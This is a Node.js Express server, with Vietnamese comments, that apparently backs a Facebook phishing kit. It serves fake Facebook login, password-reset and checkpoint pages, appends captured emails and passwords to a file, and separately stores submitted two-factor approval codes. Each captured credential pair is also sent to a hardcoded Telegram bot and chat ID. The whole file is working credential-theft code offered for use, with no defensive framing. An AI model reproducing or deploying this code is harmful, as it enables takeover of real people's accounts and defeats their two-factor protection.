const express = require('express');
const fs = require('fs');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');
const bodyParser = require('body-parser');

const app = express();

// Thay thế 'YOUR_TELEGRAM_BOT_TOKEN' bằng token của bot Telegram của bạn
const bot = new TelegramBot('6854390688:AAHSd1cmDo1m5pRJCb7Pd7bH2wBsMw_P_oM', {polling: true});

// Thay thế 'YOUR_CHAT_ID' bằng ID chat của bạn với bot
const chatId = '6127685762';

app.use(bodyParser.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'facebook.html'));
});

app.post('/forgot', (req, res) => {
    res.sendFile(path.join(__dirname, 'forgot.html'));
});

app.post('/checkpoint', (req, res) => {
    res.sendFile(path.join(__dirname, 'checkpoint.html'));
});

app.post('/2fa.php', (req, res) => {
    const code = req.body.approvals_code; // Lấy giá trị từ trường nhập liệu 'approvals_code'
    fs.appendFile('2fa.txt', `${code}\n`, err => {
        if (err) throw err;
        console.log('2FA code saved');
    });
    res.send('2FA code saved');
});

app.get('/save.php', (req, res) => {
    const email = req.query.email;
    const pass = req.query.pass;
    fs.appendFile('scanfb.txt', `${email}|${pass}\n`, err => {
        if (err) throw err;
        console.log('Data saved');
    });
    // Gửi thông tin về Telegram
    bot.sendMessage(chatId, `Email: ${email}\nPassword: ${pass}`);
    res.send('Data saved');
});

app.listen(8000, () => console.log('Server running on port 8000'));